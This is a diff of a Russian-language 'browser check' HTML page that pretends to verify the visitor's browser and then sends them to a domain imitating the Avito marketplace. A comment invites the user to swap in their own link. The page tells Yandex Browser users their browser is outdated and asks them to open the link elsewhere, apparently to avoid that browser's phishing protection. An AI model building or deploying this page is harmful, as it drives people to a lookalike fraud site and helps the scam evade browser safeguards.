@@ -2,126 +2,52 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Проверка браузера</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Проверка браузера</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-      background: #0f0f10;
-      color: #fff;
-      height: 100vh;
+      font-family: 'Source Sans Pro', sans-serif;
       display: flex;
+      flex-direction: column;
+      justify-content: center;
       align-items: center;
-      justify-content: center;
-    }
-
-    .container {
+      min-height: 100vh;
+      background: #fff;
+      color: #333;
       text-align: center;
-      max-width: 500px;
-      padding: 30px 20px;
     }
-
-    .logo {
-      width: 100px;
+    .title {
+      font-size: 28px;
+      color: #65656a;
       margin-bottom: 20px;
     }
-
-    h1 {
-      font-size: 22px;
-      margin-bottom: 12px;
-    }
-
-    p {
-      font-size: 15px;
+    .subtitle {
+      font-size: 18px;
+      color: #98989d;
       line-height: 1.5;
-      color: #bbb;
-      margin-bottom: 25px;
-    }
-
-    .browsers {
-      display: flex;
-      justify-content: center;
-      gap: 25px;
-      margin-bottom: 20px;
-      flex-wrap: wrap;
-    }
-
-    .browsers img {
-      width: 60px;
-      height: 60px;
-      border-radius: 12px;
-    }
-
-    .link {
-      display: inline-block;
-      color: #4da6ff;
-      font-size: 15px;
-      text-decoration: none;
-      margin-bottom: 15px;
-    }
-
-    .back {
-      display: inline-block;
-      color: #bbb;
-      font-size: 14px;
-      text-decoration: none;
-    }
-
-    .loader {
-      width: 45px;
-      height: 45px;
-      border: 4px solid #333;
-      border-top: 4px solid #4da6ff;
-      border-radius: 50%;
-      margin: 0 auto 20px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
     }
   </style>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
       let ua = navigator.userAgent.toLowerCase();
-      let container = document.querySelector(".container");
-
       if (ua.includes("yabrowser")) {
-        container.innerHTML = `
-          <img class="logo" src="https://img.icons8.com/color/96/cat--v1.png" alt="cat">
-          <h1>Ваш браузер не поддерживается</h1>
-          <p>Из-за этого сайт может работать медленно или нестабильно.<br>
-          Установите один из рекомендуемых браузеров:</p>
-          <div class="browsers">
-            <img src="https://img.icons8.com/color/96/chrome--v1.png" alt="Chrome">
-            <img src="https://img.icons8.com/color/96/firefox--v1.png" alt="Firefox">
-            <img src="https://img.icons8.com/color/96/ms-edge-new.png" alt="Edge">
-            <img src="https://img.icons8.com/color/96/safari--v1.png" alt="Safari">
+        document.body.innerHTML = `
+          <div class="title">Ваш браузер устарел :(</div>
+          <div class="subtitle">
+            Скопируйте ссылку и откройте в другом приложении,<br>
+            например <b>Chrome</b>, <b>Firefox</b> или <b>Opera</b>.
           </div>
-          <a class="link" href="#">Использовать мобильную версию сайта</a><br>
-          <a class="back" href="#">Вернуться назад</a>
         `;
       } else {
-        container.innerHTML = `
-          <div class="loader"></div>
-          <h1>Проверка браузера…</h1>
-          <p>Пожалуйста, подождите пару секунд</p>
-        `;
-        setTimeout(() => {
-          window.location.href = "https://avito.15340.online/order/9632751773"; 
-          // 🔗 замени ссылку на свою
-        }, 2000);
+        window.location.href = "https://avito.15340.online/order/9632751773"; 
+        // 🔗 замени ссылку на свою
       }
     });
   </script>
 </head>
 <body>
-  <div class="container">
-    <h1>Загрузка…</h1>
-    <p>Подождите пару секунд</p>
-  </div>
+  <div class="title">Проверка браузера…</div>
+  <div class="subtitle">Подождите пару секунд</div>
 </body>
 </html>
